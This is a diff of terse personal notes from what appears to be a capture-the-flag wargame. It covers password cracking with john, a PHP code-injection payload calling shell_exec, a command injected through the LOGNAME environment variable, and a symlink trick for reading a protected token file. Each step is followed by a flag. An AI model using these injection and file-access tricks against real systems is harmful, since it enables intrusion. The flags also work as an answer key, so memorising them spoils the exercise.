@@ -17,7 +17,7 @@ http://fbcs.bplaced.net/multi_encoder_decoder.html
 
 Now we have raw value in /etc/passwd
 
-Need something to break it      
+Need something to break it7
 
 john on kali vm did it
 
@@ -40,3 +40,23 @@ Flag 04 ne2searoevaevoem4ov4ar8ap
 Exploit the openarenaserver script and auto feed make it display the key
 
 Flag 05 viuaaale9huek52boumoomioc
+
+brackets are magic
+
+Flag 06 wiok45aaoguiboiki2tuin6ub
+
+[x {${shell_exec(getflag)}} ]
+
+Flag 07 fiumuikeil55xe9cu4dood66h
+
+mdr trop ez
+
+env LOGNAME=" salut; getflag" ./level07 
+
+Create a simlik with diff name in temp
+
+ln -s -f /home/user/level08/token /tmp/tok
+
+quif5eloekouj29ke0vouxean
+
+Flag 08 25749xKZ8L7DkSCwJkT9dyv6f
